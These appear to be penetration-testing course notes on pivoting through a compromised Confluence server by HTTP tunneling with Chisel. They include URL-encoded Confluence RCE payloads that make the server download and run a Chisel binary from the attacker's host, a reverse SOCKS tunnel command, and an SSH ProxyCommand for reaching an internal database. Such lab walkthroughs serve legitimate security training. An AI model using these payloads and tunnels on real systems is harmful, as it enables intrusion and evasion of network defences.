---
tags: chisel
---
## HTTP Tunneling Fundamentals

Scenario:
![[Pasted image 20240826153020.png]]
- we have compromised CONFLUENCE01, and can execute commands via HTTP requests
- a deep packet inspection (DPI) solution is terminating all outbound traffic except HTTP and all inbound ports on CONFLUENCE01 are blocked except TCP/8090

Goal: We have credentials for the PGDATABASE01 server, but need to figure out how to SSH directly there through CONFLUENCE01. We need a tunnel into the internal network, but it must resemble an outgoing HTTP connection from CONFLUENCE01.

## HTTP Tunneling with Chisel

[Chisel](https://github.com/jpillora/chisel): 
- an HTTP tunneling tool that encapsulates data stream within HTTP
- also uses SSH protocol within the tunnel to encrypt our data
- uses client-server model
- can run on macOS, Linux, and Windows, and on various architectures

Plan:
![[Pasted image 20240826161810.png]]
- Chisel option: reverse port forwarding (similar to SSH remote port forwarding)
- run Chisel server on our Kali
- Chisel client on CONFLUENCE01
- Chisel will bind a SOCKS proxy on Kali
- Chisel server will encapsulate whatever we send through the SOCKS port and push it through the SSH-encrypted HTTP tunnel
- Chisel client will decapsulate it and push it wherever it is addressed

Steps:
1. Copy Chisel client binary to CONFLUENCE01:
   Since in this case both CONFLUENCE01 and our Kali machine are both amd64 Linux machines, we can serve the same binary we have on the Kali machine
	1. Serve Chisel binary on Kali:
	   `sudo cp $(which chisel) /var/www/html/`
	   `sudo systemctl start apache2`
	2. Format this command `wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel` to work with the known RCE exploit on CONFLUENCE01:
	   `curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27 bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20- O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/`\
	3. Check the Apache log on Kali to make sure that we received the request:
	   `tail -f /var/log/apache2/access.log`
2. Allow reverse port forwarding on Kali with Chisel:
   `chisel server --port 8080 --reverse`
	- `server`: start binary as server
	- `--port`: specify bind port
	- `--reverse`: allow reverse port forward
3. On Kali, run tcpdump to log Chisel traffic:
   `sudo tcpdump -nvvvXi tun0 tcp port 8080`
4. Start Chisel client from the web shell:
   Use the command `/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &`
	- `192.168.118.4:8080`: connect to the server running on Kali
	- `R:socks`: create reverse SOCKS tunnel
	- `> /dev/null 2>&1 &`: shell redirections to force process to run in background (frees up our shell)
	Convert the above into Confluence injection payload :
	`curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27 bash%27%2C%27- c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29% 7D/`
5. Check tcpdump for traffic from the Chisel client to the Chisel server (should be instantaneous). Our Chisel server should have also logged an inbound connection.
6. Check status of our SOCKS proxy:
   `ss -ntplu`
   Our SOCKS proxy port 1080 is listening on the loopback interface of our Kali machine.
7. To run SSH through a SOCKS proxy, need to use Ncat (not Netcat):
   `sudo apt install ncat`
8. Pass an Ncat command to ProxyCommand:
   `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215`
	- ProxyCommand is a configuration option of SSH
	- `ncat`
		- `--proxy-type socks5`: use socks5 protocol
		- `--proxy 127.0.0.1:1080`: use this proxy socket
		- `%h %p`: the SSH command host and port values, which SSH will fill in before running the command
9. We should get a shell to PGDATABASE01
   
